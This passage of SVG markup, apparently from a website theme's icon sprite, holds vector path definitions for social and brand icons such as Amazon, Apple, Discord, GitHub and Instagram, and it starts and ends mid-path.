.21437.11032.53239.53239,0,0,0,.35708-.19486c.29792-.30419.14885-.46821.07676-.54751l-.69954-.69975.72952-.73469c.16-.17311.01874-.35708-.12218-.498-.20461-.20461-.402-.25742-.52855-.14083l-.7254.72665-.73354-.73375a.20128.20128,0,0,0-.14179-.05695.54135.54135,0,0,0-.34379.19648c-.22561.22555-.274.38149-.15656.5059l.73374.7315-.72942.73072A.26589.26589,0,0,0,11.59191,14.05782Zm1.59866-9.915A8.86081,8.86081,0,0,0,9.854,4.776a.26169.26169,0,0,0-.16938.22759.92978.92978,0,0,0,.08619.42094c.05682.14524.20779.531.50006.41955a8.40969,8.40969,0,0,1,2.91968-.55484,7.87875,7.87875,0,0,1,3.086.62286,8.61817,8.61817,0,0,1,2.30562,1.49315.2781.2781,0,0,0,.18318.07586c.15529,0,.30425-.15253.43167-.29551.21268-.23861.35873-.4369.1492-.63538a8.50425,8.50425,0,0,0-2.62312-1.694A9.0177,9.0177,0,0,0,13.19058,4.14283ZM19.50945,18.6236h0a.93171.93171,0,0,0-.36642-.25406.26589.26589,0,0,0-.27613.06613l-.06943.06929A7.90606,7.90606,0,0,1,7.60639,18.505a7.57284,7.57284,0,0,1-1.696-2.51537,8.58715,8.58715,0,0,1-.5147-1.77754l-.00871-.04864c-.04939-.25873-.28755-.27684-.62981-.22448-.14234.02178-.5755.088-.53426.39969l.001.00712a9.08807,9.08807,0,0,0,15.406,4.99094c.00193-.00192.04753-.04718.0725-.07436C19.79425,19.16234,19.87422,18.98728,19.50945,18.6236Z"/>
</symbol>
<symbol id="icon-amazon" viewBox="0 0 24 24">
<path d="M13.582,8.182C11.934,8.367,9.78,8.49,8.238,9.166c-1.781,0.769-3.03,2.337-3.03,4.644 c0,2.953,1.86,4.429,4.253,4.429c2.02,0,3.125-0.477,4.685-2.065c0.516,0.747,0.685,1.109,1.629,1.894 c0.212,0.114,0.483,0.103,0.672-0.066l0.006,0.006c0.567-0.505,1.599-1.401,2.18-1.888c0.231-0.188,0.19-0.496,0.009-0.754 c-0.52-0.718-1.072-1.303-1.072-2.634V8.305c0-1.876,0.133-3.599-1.249-4.891C15.23,2.369,13.422,2,12.04,2 C9.336,2,6.318,3.01,5.686,6.351C5.618,6.706,5.877,6.893,6.109,6.945l2.754,0.298C9.121,7.23,9.308,6.977,9.357,6.72 c0.236-1.151,1.2-1.706,2.284-1.706c0.584,0,1.249,0.215,1.595,0.738c0.398,0.584,0.346,1.384,0.346,2.061V8.182z M13.049,14.088 c-0.451,0.8-1.169,1.291-1.967,1.291c-1.09,0-1.728-0.83-1.728-2.061c0-2.42,2.171-2.86,4.227-2.86v0.615 C13.582,12.181,13.608,13.104,13.049,14.088z M20.683,19.339C18.329,21.076,14.917,22,11.979,22c-4.118,0-7.826-1.522-10.632-4.057 c-0.22-0.199-0.024-0.471,0.241-0.317c3.027,1.762,6.771,2.823,10.639,2.823c2.608,0,5.476-0.541,8.115-1.66 C20.739,18.62,21.072,19.051,20.683,19.339z M21.336,21.043c-0.194,0.163-0.379,0.076-0.293-0.139 c0.284-0.71,0.92-2.298,0.619-2.684c-0.301-0.386-1.99-0.183-2.749-0.092c-0.23,0.027-0.266-0.173-0.059-0.319 c1.348-0.946,3.555-0.673,3.811-0.356C22.925,17.773,22.599,19.986,21.336,21.043z"/>
</symbol>
<symbol id="icon-apple" viewBox="0 0 24 24">
<path d="M20.07,17.586a10.874,10.874,0,0,1-1.075,1.933,9.822,9.822,0,0,1-1.385,1.674,2.687,2.687,0,0,1-1.78.784,4.462,4.462,0,0,1-1.644-.393,4.718,4.718,0,0,0-1.77-.391,4.878,4.878,0,0,0-1.82.391A4.9,4.9,0,0,1,9.021,22a2.53,2.53,0,0,1-1.82-.8A10.314,10.314,0,0,1,5.752,19.46,11.987,11.987,0,0,1,4.22,16.417a11.143,11.143,0,0,1-.643-3.627,6.623,6.623,0,0,1,.87-3.465A5.1,5.1,0,0,1,6.268,7.483a4.9,4.9,0,0,1,2.463-.695,5.8,5.8,0,0,1,1.9.443,6.123,6.123,0,0,0,1.511.444,9.04,9.04,0,0,0,1.675-.523,5.537,5.537,0,0,1,2.277-.4,4.835,4.835,0,0,1,3.788,1.994,4.213,4.213,0,0,0-2.235,3.827,4.222,4.222,0,0,0,1.386,3.181,4.556,4.556,0,0,0,1.385.909q-.167.483-.353.927ZM16.211,2.4a4.267,4.267,0,0,1-1.094,2.8,3.726,3.726,0,0,1-3.1,1.528A3.114,3.114,0,0,1,12,6.347a4.384,4.384,0,0,1,1.16-2.828,4.467,4.467,0,0,1,1.414-1.061A4.215,4.215,0,0,1,16.19,2a3.633,3.633,0,0,1,.021.4Z"/>
</symbol>
<symbol id="icon-bandcamp" viewBox="0 0 24 24">
<path d="M15.27 17.289 3 17.289 8.73 6.711 21 6.711 15.27 17.289"/>
</symbol>
<symbol id="icon-behance" viewBox="0 0 24 24">
<path d="M7.799,5.698c0.589,0,1.12,0.051,1.606,0.156c0.482,0.102,0.894,0.273,1.241,0.507c0.344,0.235,0.612,0.546,0.804,0.938 c0.188,0.387,0.281,0.871,0.281,1.443c0,0.619-0.141,1.137-0.421,1.551c-0.284,0.413-0.7,0.751-1.255,1.014 c0.756,0.218,1.317,0.601,1.689,1.146c0.374,0.549,0.557,1.205,0.557,1.975c0,0.623-0.12,1.161-0.359,1.612 c-0.241,0.457-0.569,0.828-0.973,1.114c-0.408,0.288-0.876,0.5-1.399,0.637C9.052,17.931,8.514,18,7.963,18H2V5.698H7.799 M7.449,10.668c0.481,0,0.878-0.114,1.192-0.345c0.311-0.228,0.463-0.603,0.463-1.119c0-0.286-0.051-0.523-0.152-0.707 C8.848,8.315,8.711,8.171,8.536,8.07C8.362,7.966,8.166,7.894,7.94,7.854c-0.224-0.044-0.457-0.06-0.697-0.06H4.709v2.874H7.449z M7.6,15.905c0.267,0,0.521-0.024,0.759-0.077c0.243-0.053,0.457-0.137,0.637-0.261c0.182-0.12,0.332-0.283,0.441-0.491 C9.547,14.87,9.6,14.602,9.6,14.278c0-0.633-0.18-1.084-0.533-1.357c-0.356-0.27-0.83-0.404-1.413-0.404H4.709v3.388L7.6,15.905z M16.162,15.864c0.367,0.358,0.897,0.538,1.583,0.538c0.493,0,0.92-0.125,1.277-0.374c0.354-0.248,0.571-0.514,0.654-0.79h2.155 c-0.347,1.072-0.872,1.838-1.589,2.299C19.534,18,18.67,18.23,17.662,18.23c-0.701,0-1.332-0.113-1.899-0.337 c-0.567-0.227-1.041-0.544-1.439-0.958c-0.389-0.415-0.689-0.907-0.904-1.484c-0.213-0.574-0.32-1.21-0.32-1.899 c0-0.666,0.11-1.288,0.329-1.863c0.222-0.577,0.529-1.075,0.933-1.492c0.406-0.42,0.885-0.751,1.444-0.994 c0.558-0.241,1.175-0.363,1.857-0.363c0.754,0,1.414,0.145,1.98,0.44c0.563,0.291,1.026,0.686,1.389,1.181 c0.363,0.493,0.622,1.057,0.783,1.69c0.16,0.632,0.217,1.292,0.171,1.983h-6.428C15.557,14.84,15.795,15.506,16.162,15.864 M18.973,11.184c-0.291-0.321-0.783-0.496-1.384-0.496c-0.39,0-0.714,0.066-0.973,0.2c-0.254,0.132-0.461,0.297-0.621,0.491 c-0.157,0.197-0.265,0.405-0.328,0.628c-0.063,0.217-0.101,0.413-0.111,0.587h3.98C19.478,11.969,19.265,11.509,18.973,11.184z M15.057,7.738h4.985V6.524h-4.985L15.057,7.738z"/>
</symbol>
<symbol id="icon-blogger" viewBox="0 0 24 24">
<path d="M14.722,14.019c0,0.361-0.293,0.654-0.654,0.654H9.977c-0.361,0-0.654-0.293-0.654-0.654s0.293-0.654,0.654-0.654h4.091C14.429,13.365,14.722,13.658,14.722,14.019z M9.981,10.698h2.038c0.382,0,0.692-0.31,0.692-0.692c0-0.382-0.31-0.692-0.692-0.692H9.981c-0.382,0-0.692,0.31-0.692,0.692C9.289,10.388,9.599,10.698,9.981,10.698z M21,5v14c0,1.105-0.895,2-2,2H5c-1.105,0-2-0.895-2-2V5c0-1.105,0.895-2,2-2h14C20.105,3,21,3.895,21,5z M17.544,11.39c0-0.398-0.322-0.72-0.72-0.72h-0.607l-0.013,0.001c-0.38,0-0.692-0.295-0.718-0.668l-0.001-0.008c0-1.988-1.611-3.599-3.599-3.599h-1.816c-1.988,0-3.599,1.611-3.599,3.599v3.947c0,1.987,1.611,3.599,3.599,3.599h3.874c1.988,0,3.599-1.611,3.599-3.599L17.544,11.39z"/>
</symbol>
<symbol id="icon-chain" viewBox="0 0 24 24">
<path d="M19.647,16.706a1.134,1.134,0,0,0-.343-.833l-2.549-2.549a1.134,1.134,0,0,0-.833-.343,1.168,1.168,0,0,0-.883.392l.233.226q.2.189.264.264a2.922,2.922,0,0,1,.184.233.986.986,0,0,1,.159.312,1.242,1.242,0,0,1,.043.337,1.172,1.172,0,0,1-1.176,1.176,1.237,1.237,0,0,1-.337-.043,1,1,0,0,1-.312-.159,2.76,2.76,0,0,1-.233-.184q-.073-.068-.264-.264l-.226-.233a1.19,1.19,0,0,0-.4.895,1.134,1.134,0,0,0,.343.833L15.837,19.3a1.13,1.13,0,0,0,.833.331,1.18,1.18,0,0,0,.833-.318l1.8-1.789a1.12,1.12,0,0,0,.343-.821Zm-8.615-8.64a1.134,1.134,0,0,0-.343-.833L8.163,4.7a1.134,1.134,0,0,0-.833-.343,1.184,1.184,0,0,0-.833.331L4.7,6.473a1.12,1.12,0,0,0-.343.821,1.134,1.134,0,0,0,.343.833l2.549,2.549a1.13,1.13,0,0,0,.833.331,1.184,1.184,0,0,0,.883-.38L8.728,10.4q-.2-.189-.264-.264A2.922,2.922,0,0,1,8.28,9.9a.986.986,0,0,1-.159-.312,1.242,1.242,0,0,1-.043-.337A1.172,1.172,0,0,1,9.254,8.079a1.237,1.237,0,0,1,.337.043,1,1,0,0,1,.312.159,2.761,2.761,0,0,1,.233.184q.073.068.264.264l.226.233a1.19,1.19,0,0,0,.4-.895ZM22,16.706a3.343,3.343,0,0,1-1.042,2.488l-1.8,1.789a3.536,3.536,0,0,1-4.988-.025l-2.525-2.537a3.384,3.384,0,0,1-1.017-2.488,3.448,3.448,0,0,1,1.078-2.561l-1.078-1.078a3.434,3.434,0,0,1-2.549,1.078,3.4,3.4,0,0,1-2.5-1.029L3.029,9.794A3.4,3.4,0,0,1,2,7.294,3.343,3.343,0,0,1,3.042,4.806l1.8-1.789A3.384,3.384,0,0,1,7.331,2a3.357,3.357,0,0,1,2.5,1.042l2.525,2.537a3.384,3.384,0,0,1,1.017,2.488,3.448,3.448,0,0,1-1.078,2.561l1.078,1.078a3.551,3.551,0,0,1,5.049-.049l2.549,2.549A3.4,3.4,0,0,1,22,16.706Z"/>
</symbol>
<symbol id="icon-codepen" viewBox="0 0 24 24">
<path d="M22.016,8.84c-0.002-0.013-0.005-0.025-0.007-0.037c-0.005-0.025-0.008-0.048-0.015-0.072 c-0.003-0.015-0.01-0.028-0.013-0.042c-0.008-0.02-0.015-0.04-0.023-0.062c-0.007-0.015-0.013-0.028-0.02-0.042 c-0.008-0.02-0.018-0.037-0.03-0.057c-0.007-0.013-0.017-0.027-0.025-0.038c-0.012-0.018-0.023-0.035-0.035-0.052 c-0.01-0.013-0.02-0.025-0.03-0.037c-0.015-0.017-0.028-0.032-0.043-0.045c-0.01-0.012-0.022-0.023-0.035-0.035 c-0.015-0.015-0.032-0.028-0.048-0.04c-0.012-0.01-0.025-0.02-0.037-0.03c-0.005-0.003-0.01-0.008-0.015-0.012l-9.161-6.096 c-0.289-0.192-0.666-0.192-0.955,0L2.359,8.237C2.354,8.24,2.349,8.245,2.344,8.249L2.306,8.277 c-0.017,0.013-0.033,0.027-0.048,0.04C2.246,8.331,2.234,8.342,2.222,8.352c-0.015,0.015-0.028,0.03-0.042,0.047 c-0.012,0.013-0.022,0.023-0.03,0.037C2.139,8.453,2.125,8.471,2.115,8.488C2.107,8.501,2.099,8.514,2.09,8.526 C2.079,8.548,2.069,8.565,2.06,8.585C2.054,8.6,2.047,8.613,2.04,8.626C2.032,8.648,2.025,8.67,2.019,8.69 c-0.005,0.013-0.01,0.027-0.013,0.042C1.999,8.755,1.995,8.778,1.99,8.803C1.989,8.817,1.985,8.828,1.984,8.84 C1.978,8.879,1.975,8.915,1.975,8.954v6.093c0,0.037,0.003,0.075,0.008,0.112c0.002,0.012,0.005,0.025,0.007,0.038 c0.005,0.023,0.008,0.047,0.015,0.072c0.003,0.015,0.008,0.028,0.013,0.04c0.007,0.022,0.013,0.042,0.022,0.063 c0.007,0.015,0.013,0.028,0.02,0.04c0.008,0.02,0.018,0.038,0.03,0.058c0.007,0.013,0.015,0.027,0.025,0.038 c0.012,0.018,0.023,0.035,0.035,0.052c0.01,0.013,0.02,0.025,0.03,0.037c0.013,0.015,0.028,0.032,0.042,0.045 c0.012,0.012,0.023,0.023,0.035,0.035c0.015,0.013,0.032,0.028,0.048,0.04l0.038,0.03c0.005,0.003,0.01,0.007,0.013,0.01 l9.163,6.095C11.668,21.953,11.833,22,12,22c0.167,0,0.332-0.047,0.478-0.144l9.163-6.095l0.015-0.01 c0.013-0.01,0.027-0.02,0.037-0.03c0.018-0.013,0.035-0.028,0.048-0.04c0.013-0.012,0.025-0.023,0.035-0.035 c0.017-0.015,0.03-0.032,0.043-0.045c0.01-0.013,0.02-0.025,0.03-0.037c0.013-0.018,0.025-0.035,0.035-0.052 c0.008-0.013,0.018-0.027,0.025-0.038c0.012-0.02,0.022-0.038,0.03-0.058c0.007-0.013,0.013-0.027,0.02-0.04 c0.008-0.022,0.015-0.042,0.023-0.063c0.003-0.013,0.01-0.027,0.013-0.04c0.007-0.025,0.01-0.048,0.015-0.072 c0.002-0.013,0.005-0.027,0.007-0.037c0.003-0.042,0.007-0.079,0.007-0.117V8.954C22.025,8.915,22.022,8.879,22.016,8.84z M12.862,4.464l6.751,4.49l-3.016,2.013l-3.735-2.492V4.464z M11.138,4.464v4.009l-3.735,2.494L4.389,8.954L11.138,4.464z M3.699,10.562L5.853,12l-2.155,1.438V10.562z M11.138,19.536l-6.749-4.491l3.015-2.011l3.735,2.492V19.536z M12,14.035L8.953,12 L12,9.966L15.047,12L12,14.035z M12.862,19.536v-4.009l3.735-2.492l3.016,2.011L12.862,19.536z M20.303,13.438L18.147,12 l2.156-1.438L20.303,13.438z"/>
</symbol>
<symbol id="icon-deviantart" viewBox="0 0 24 24">
<path d="M 18.19 5.636 18.19 2 18.188 2 14.553 2 14.19 2.366 12.474 5.636 11.935 6 5.81 6 5.81 10.994 9.177 10.994 9.477 11.357 5.81 18.363 5.81 22 5.811 22 9.447 22 9.81 21.634 11.526 18.364 12.065 18 18.19 18 18.19 13.006 14.823 13.006 14.523 12.641 18.19 5.636z"/>
</symbol>
<symbol id="icon-digg" viewBox="0 0 24 24">
<path d="M4.5,5.4h2.2V16H1V8.5h3.5V5.4L4.5,5.4z M4.5,14.2v-4H3.2v4H4.5z M7.6,8.5V16h2.2V8.5C9.8,8.5,7.6,8.5,7.6,8.5z M7.6,5.4 v2.2h2.2V5.4C9.8,5.4,7.6,5.4,7.6,5.4z M10.7,8.5h5.7v10.1h-5.7v-1.8h3.5V16h-3.5C10.7,16,10.7,8.5,10.7,8.5z M14.2,14.2v-4h-1.3v4 H14.2z M17.3,8.5H23v10.1h-5.7v-1.8h3.5V16h-3.5C17.3,16,17.3,8.5,17.3,8.5z M20.8,14.2v-4h-1.3v4H20.8z"/>
</symbol>
<symbol id="icon-discord" viewBox="0 0 24 24">
<path d="M10.227 9.957c-.559 0-1 .48-1 1.063 0 .585.453 1.066 1 1.066.558 0 1-.48 1-1.066.007-.582-.442-1.063-1-1.063zm3.574 0c-.559 0-.996.48-.996 1.063 0 .585.449 1.066.996 1.066.558 0 1-.48 1-1.066 0-.582-.442-1.063-1-1.063zm0 0 M18.563 1.918H5.438c-1.11 0-2.008.879-2.008 1.973v12.957c0 1.093.898 1.972 2.007 1.972h11.11l-.52-1.773 1.254 1.14 1.184 1.075 2.105 1.82V3.891c0-1.094-.898-1.973-2.008-1.973zM14.78 14.434s-.351-.414-.644-.778c1.281-.355 1.773-1.14 1.773-1.14a5.745 5.745 0 0 1-1.129.566c-.488.2-.96.336-1.418.41a7.07 7.07 0 0 1-2.539-.008 8.133 8.133 0 0 1-1.441-.414 6.219 6.219 0 0 1-.715-.324c-.027-.02-.059-.027-.086-.047a.113.113 0 0 1-.039-.031c-.176-.094-.273-.16-.273-.16s.468.765 1.71 1.129c-.293.363-.656.797-.656.797-2.164-.067-2.984-1.457-2.984-1.457 0-3.086 1.41-5.586 1.41-5.586 1.41-1.036 2.75-1.008 2.75-1.008l.098.113c-1.762.5-2.575 1.258-2.575 1.258s.215-.117.579-.277c1.046-.454 1.878-.579 2.222-.606.059-.008.11-.02.168-.02a8.728 8.728 0 0 1 1.977-.019c.933.106 1.93.375 2.949.922 0 0-.773-.719-2.438-1.219l.137-.152s1.34-.028 2.75 1.008c0 0 1.414 2.5 1.414 5.586 0 0-.836 1.39-3 1.457zm0 0"/>
</symbol>
<symbol id="icon-dribbble" viewBox="0 0 24 24">
<path d="M12,22C6.486,22,2,17.514,2,12S6.486,2,12,2c5.514,0,10,4.486,10,10S17.514,22,12,22z M20.434,13.369 c-0.292-0.092-2.644-0.794-5.32-0.365c1.117,3.07,1.572,5.57,1.659,6.09C18.689,17.798,20.053,15.745,20.434,13.369z M15.336,19.876c-0.127-0.749-0.623-3.361-1.822-6.477c-0.019,0.006-0.038,0.013-0.056,0.019c-4.818,1.679-6.547,5.02-6.701,5.334 c1.448,1.129,3.268,1.803,5.243,1.803C13.183,20.555,14.311,20.313,15.336,19.876z M5.654,17.724 c0.193-0.331,2.538-4.213,6.943-5.637c0.111-0.036,0.224-0.07,0.337-0.102c-0.214-0.485-0.448-0.971-0.692-1.45 c-4.266,1.277-8.405,1.223-8.778,1.216c-0.003,0.087-0.004,0.174-0.004,0.261C3.458,14.207,4.29,16.21,5.654,17.724z M3.639,10.264 c0.382,0.005,3.901,0.02,7.897-1.041c-1.415-2.516-2.942-4.631-3.167-4.94C5.979,5.41,4.193,7.613,3.639,10.264z M9.998,3.709 c0.236,0.316,1.787,2.429,3.187,5c3.037-1.138,4.323-2.867,4.477-3.085C16.154,4.286,14.17,3.471,12,3.471 C11.311,3.471,10.641,3.554,9.998,3.709z M18.612,6.612C18.432,6.855,17,8.69,13.842,9.979c0.199,0.407,0.389,0.821,0.567,1.237 c0.063,0.148,0.124,0.295,0.184,0.441c2.842-0.357,5.666,0.215,5.948,0.275C20.522,9.916,19.801,8.065,18.612,6.612z"/>
</symbol>
<symbol id="icon-dropbox" viewBox="0 0 24 24">
<path d="M12,6.134L6.069,9.797L2,6.54l5.883-3.843L12,6.134z M2,13.054l5.883,3.843L12,13.459L6.069,9.797L2,13.054z M12,13.459 l4.116,3.439L22,13.054l-4.069-3.257L12,13.459z M22,6.54l-5.884-3.843L12,6.134l5.931,3.663L22,6.54z M12.011,14.2l-4.129,3.426 l-1.767-1.153v1.291l5.896,3.539l5.897-3.539v-1.291l-1.769,1.153L12.011,14.2z"/>
</symbol>
<symbol id="icon-etsy" viewBox="0 0 24 24">
<path d="M9.16033,4.038c0-.27174.02717-.43478.48913-.43478h6.22283c1.087,0,1.68478.92391,2.11957,2.663l.35326,1.38587h1.05978C19.59511,3.712,19.75815,2,19.75815,2s-2.663.29891-4.23913.29891h-7.962L3.29076,2.163v1.1413L4.731,3.57609c1.00543.19022,1.25.40761,1.33152,1.33152,0,0,.08152,2.71739.08152,7.20109s-.08152,7.17391-.08152,7.17391c0,.81522-.32609,1.11413-1.33152,1.30435l-1.44022.27174V22l4.2663-.13587h7.11957c1.60326,0,5.32609.13587,5.32609.13587.08152-.97826.625-5.40761.70652-5.89674H19.7038L18.644,18.52174c-.84239,1.90217-2.06522,2.038-3.42391,2.038H11.1712c-1.3587,0-2.01087-.54348-2.01087-1.712V12.65217s3.0163,0,3.99457.08152c.76087.05435,1.22283.27174,1.46739,1.33152l.32609,1.413h1.16848l-.08152-3.55978.163-3.587H15.02989l-.38043,1.57609c-.24457,1.03261-.40761,1.22283-1.46739,1.33152-1.38587.13587-4.02174.1087-4.02174.1087Z"/>
</symbol>
<symbol id="icon-eventbrite" viewBox="0 0 24 24">
<path style="fill-rule:evenodd;clip-rule:evenodd;" d="M18.041,3.931L5.959,3C4.325,3,3,4.325,3,5.959v12.083C3,19.675,4.325,21,5.959,21l12.083-0.931C19.699,19.983,21,18.744,21,17.11V6.89C21,5.256,19.741,4.027,18.041,3.931zM16.933,8.17c-0.082,0.215-0.192,0.432-0.378,0.551c-0.188,0.122-0.489,0.132-0.799,0.132c-1.521,0-3.062-0.048-4.607-0.048c-0.152,0.708-0.304,1.416-0.451,2.128c0.932-0.004,1.873,0.005,2.81,0.005c0.726,0,1.462-0.069,1.586,0.525c0.04,0.189-0.001,0.426-0.052,0.615c-0.105,0.38-0.258,0.676-0.625,0.783c-0.185,0.054-0.408,0.058-0.646,0.058c-1.145,0-2.345,0.017-3.493,0.02c-0.169,0.772-0.328,1.553-0.489,2.333c1.57-0.005,3.067-0.041,4.633-0.058c0.627-0.007,1.085,0.194,1.009,0.85c-0.031,0.262-0.098,0.497-0.211,0.725c-0.102,0.208-0.248,0.376-0.488,0.452c-0.237,0.075-0.541,0.064-0.862,0.078c-0.304,0.014-0.614,0.008-0.924,0.016c-0.309,0.009-0.619,0.022-0.919,0.022c-1.253,0-2.429,0.08-3.683,0.073c-0.603-0.004-1.014-0.249-1.124-0.757c-0.059-0.273-0.018-0.58,0.036-0.841c0.541-2.592,1.083-5.176,1.629-7.763c0.056-0.265,0.114-0.511,0.225-0.714C9.279,7.051,9.534,6.834,9.9,6.735c0.368-0.099,0.883-0.047,1.344-0.047c0.305,0,0.612,0.008,0.914,0.016c0.925,0.026,1.817,0.03,2.747,0.053c0.304,0.007,0.615,0.016,0.915,0.016c0.621,0,1.17,0.073,1.245,0.614C17.104,7.675,17.014,7.954,16.933,8.17z"/>
</symbol>
<symbol id="icon-facebook" viewBox="0 0 24 24">
<path d="M12,2C6.5,2,2,6.5,2,12c0,5,3.7,9.1,8.4,9.9v-7H7.9V12h2.5V9.8c0-2.5,1.5-3.9,3.8-3.9c1.1,0,2.2,0.2,2.2,0.2v2.5h-1.3 c-1.2,0-1.6,0.8-1.6,1.6V12h2.8l-0.4,2.9h-2.3v7C18.3,21.1,22,17,22,12C22,6.5,17.5,2,12,2z"/>
</symbol>
<symbol id="icon-feed" viewBox="0 0 24 24">
<path d="M2,8.667V12c5.515,0,10,4.485,10,10h3.333C15.333,14.637,9.363,8.667,2,8.667z M2,2v3.333 c9.19,0,16.667,7.477,16.667,16.667H22C22,10.955,13.045,2,2,2z M4.5,17C3.118,17,2,18.12,2,19.5S3.118,22,4.5,22S7,20.88,7,19.5 S5.882,17,4.5,17z"/>
</symbol>
<symbol id="icon-flickr" viewBox="0 0 24 24">
<path d="M6.5,7c-2.75,0-5,2.25-5,5s2.25,5,5,5s5-2.25,5-5S9.25,7,6.5,7z M17.5,7c-2.75,0-5,2.25-5,5s2.25,5,5,5s5-2.25,5-5 S20.25,7,17.5,7z"/>
</symbol>
<symbol id="icon-foursquare" viewBox="0 0 24 24">
<path d="M17.573,2c0,0-9.197,0-10.668,0S5,3.107,5,3.805s0,16.948,0,16.948c0,0.785,0.422,1.077,0.66,1.172 c0.238,0.097,0.892,0.177,1.285-0.275c0,0,5.035-5.843,5.122-5.93c0.132-0.132,0.132-0.132,0.262-0.132h3.26 c1.368,0,1.588-0.977,1.732-1.552c0.078-0.318,0.692-3.428,1.225-6.122l0.675-3.368C19.56,2.893,19.14,2,17.573,2z M16.495,7.22 c-0.053,0.252-0.372,0.518-0.665,0.518c-0.293,0-4.157,0-4.157,0c-0.467,0-0.802,0.318-0.802,0.787v0.508 c0,0.467,0.337,0.798,0.805,0.798c0,0,3.197,0,3.528,0s0.655,0.362,0.583,0.715c-0.072,0.353-0.407,2.102-0.448,2.295 c-0.04,0.193-0.262,0.523-0.655,0.523c-0.33,0-2.88,0-2.88,0c-0.523,0-0.683,0.068-1.033,0.503 c-0.35,0.437-3.505,4.223-3.505,4.223c-0.032,0.035-0.063,0.027-0.063-0.015V4.852c0-0.298,0.26-0.648,0.648-0.648 c0,0,8.228,0,8.562,0c0.315,0,0.61,0.297,0.528,0.683L16.495,7.22z"/>
</symbol>
<symbol id="icon-ghost" viewBox="0 0 24 24">
<path d="M10.203,20.997H3.005v-3.599h7.198V20.997z M20.995,17.398h-7.193v3.599h7.193V17.398z M20.998,10.2H3v3.599h17.998V10.2zM13.803,3.003H3.005v3.599h10.798V3.003z M21,3.003h-3.599v3.599H21V3.003z"/>
</symbol>
<symbol id="icon-goodreads" viewBox="0 0 24 24">
<path d="M17.3,17.5c-0.2,0.8-0.5,1.4-1,1.9c-0.4,0.5-1,0.9-1.7,1.2C13.9,20.9,13.1,21,12,21c-0.6,0-1.3-0.1-1.9-0.2 c-0.6-0.1-1.1-0.4-1.6-0.7c-0.5-0.3-0.9-0.7-1.2-1.2c-0.3-0.5-0.5-1.1-0.5-1.7h1.5c0.1,0.5,0.2,0.9,0.5,1.2 c0.2,0.3,0.5,0.6,0.9,0.8c0.3,0.2,0.7,0.3,1.1,0.4c0.4,0.1,0.8,0.1,1.2,0.1c1.4,0,2.5-0.4,3.1-1.2c0.6-0.8,1-2,1-3.5v-1.7h0 c-0.4,0.8-0.9,1.4-1.6,1.9c-0.7,0.5-1.5,0.7-2.4,0.7c-1,0-1.9-0.2-2.6-0.5C8.7,15,8.1,14.5,7.7,14c-0.5-0.6-0.8-1.3-1-2.1 c-0.2-0.8-0.3-1.6-0.3-2.5c0-0.9,0.1-1.7,0.4-2.5c0.3-0.8,0.6-1.5,1.1-2c0.5-0.6,1.1-1,1.8-1.4C10.3,3.2,11.1,3,12,3 c0.5,0,0.9,0.1,1.3,0.2c0.4,0.1,0.8,0.3,1.1,0.5c0.3,0.2,0.6,0.5,0.9,0.8c0.3,0.3,0.5,0.6,0.6,1h0V3.4h1.5V15 C17.6,15.9,17.5,16.7,17.3,17.5z M13.8,14.1c0.5-0.3,0.9-0.7,1.3-1.1c0.3-0.5,0.6-1,0.8-1.6c0.2-0.6,0.3-1.2,0.3-1.9 c0-0.6-0.1-1.2-0.2-1.9c-0.1-0.6-0.4-1.2-0.7-1.7c-0.3-0.5-0.7-0.9-1.3-1.2c-0.5-0.3-1.1-0.5-1.9-0.5s-1.4,0.2-1.9,0.5 c-0.5,0.3-1,0.7-1.3,1.2C8.5,6.4,8.3,7,8.1,7.6C8,8.2,7.9,8.9,7.9,9.5c0,0.6,0.1,1.3,0.2,1.9C8.3,12,8.6,12.5,8.9,13 c0.3,0.5,0.8,0.8,1.3,1.1c0.5,0.3,1.1,0.4,1.9,0.4C12.7,14.5,13.3,14.4,13.8,14.1z"/>
</symbol>
<symbol id="icon-google" viewBox="0 0 24 24">
<path d="M12.02,10.18v3.72v0.01h5.51c-0.26,1.57-1.67,4.22-5.5,4.22c-3.31,0-6.01-2.75-6.01-6.12s2.7-6.12,6.01-6.12 c1.87,0,3.13,0.8,3.85,1.48l2.84-2.76C16.99,2.99,14.73,2,12.03,2c-5.52,0-10,4.48-10,10s4.48,10,10,10c5.77,0,9.6-4.06,9.6-9.77 c0-0.83-0.11-1.42-0.25-2.05H12.02z"/>
</symbol>
<symbol id="icon-github" viewBox="0 0 24 24">
<path d="M12,2C6.477,2,2,6.477,2,12c0,4.419,2.865,8.166,6.839,9.489c0.5,0.09,0.682-0.218,0.682-0.484 c0-0.236-0.009-0.866-0.014-1.699c-2.782,0.602-3.369-1.34-3.369-1.34c-0.455-1.157-1.11-1.465-1.11-1.465 c-0.909-0.62,0.069-0.608,0.069-0.608c1.004,0.071,1.532,1.03,1.532,1.03c0.891,1.529,2.341,1.089,2.91,0.833
c0.091-0.647,0.349-1.086,0.635-1.337c-2.22-0.251-4.555-1.111-4.555-4.943c0-1.091,0.39-1.984,1.03-2.682 C6.546,8.54,6.202,7.524,6.746,6.148c0,0,0.84-0.269,2.75,1.025C10.295,6.95,11.15,6.84,12,6.836 c0.85,0.004,1.705,0.114,2.504,0.336c1.909-1.294,2.748-1.025,2.748-1.025c0.546,1.376,0.202,2.394,0.1,2.646 c0.64,0.699,1.026,1.591,1.026,2.682c0,3.841-2.337,4.687-4.565,4.935c0.359,0.307,0.679,0.917,0.679,1.852 c0,1.335-0.012,2.415-0.012,2.741c0,0.269,0.18,0.579,0.688,0.481C19.138,20.161,22,16.416,22,12C22,6.477,17.523,2,12,2z"/>
</symbol>
<symbol id="icon-instagram" viewBox="0 0 24 24">
<path d="M12,4.622c2.403,0,2.688,0.009,3.637,0.052c0.877,0.04,1.354,0.187,1.671,0.31c0.42,0.163,0.72,0.358,1.035,0.673 c0.315,0.315,0.51,0.615,0.673,1.035c0.123,0.317,0.27,0.794,0.31,1.671c0.043,0.949,0.052,1.234,0.052,3.637 s-0.009,2.688-0.052,3.637c-0.04,0.877-0.187,1.354-0.31,1.671c-0.163,0.42-0.358,0.72-0.673,1.035 c-0.315,0.315-0.615,0.51-1.035,0.673c-0.317,0.123-0.794,0.27-1.671,0.31c-0.949,0.043-1.233,0.052-3.637,0.052 s-2.688-0.009-3.637-0.052c-0.877-0.04-1.354-0.187-1.671-0.31c-0.42-0.163-0.72-0.358-1.035-0.673 c-0.315-0.315-0.51-0.615-0.673-1.035c-0.123-0.317-0.27-0.794-0.31-1.671C4.631,14.688,4.622,14.403,4.622,12 s0.009-2.688,0.052-3.637c0.04-0.877,0.187-1.354,0.31-1.671c0.163-0.42,0.358-0.72,0.673-1.035 